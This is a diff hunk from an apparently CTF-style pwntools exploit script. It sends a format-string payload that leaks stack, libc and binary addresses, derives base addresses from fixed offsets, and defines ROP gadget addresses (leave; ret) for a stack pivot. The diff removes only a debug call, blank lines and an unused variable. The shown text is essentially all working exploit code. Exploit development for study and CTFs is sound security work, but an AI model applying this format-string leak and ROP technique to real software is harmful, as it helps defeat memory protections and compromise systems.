@@ -35,19 +35,14 @@ libcdelate = 0x7f57df429d0a - 0x7f57df406000
 elfdelate = 0x56509590e220 - 0x0056509590d000
 
 payload = "%68$p-%71$p-%70$p"
-ddebug()
 io.sendlineafter("to post?\n", payload)
 io.recvuntil("\n")
 rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
 success("rsp -> " + hex(rbp_0x200))
-
 libc.address = int(io.recvuntil("-")[:-1], 16) - libcdelate
 success("libcaddress -> " + hex(libc.address))
-
 elf.address = int(io.recvuntil("\n"), 16) - elfdelate
 success("elfcaddress -> " + hex(elf.address))
-
-b = hex(elf.address + 0x1206)
 
 leave_ret = elf.address + 0x0000000000001217
 ret = elf.address + 0x0000000000001016
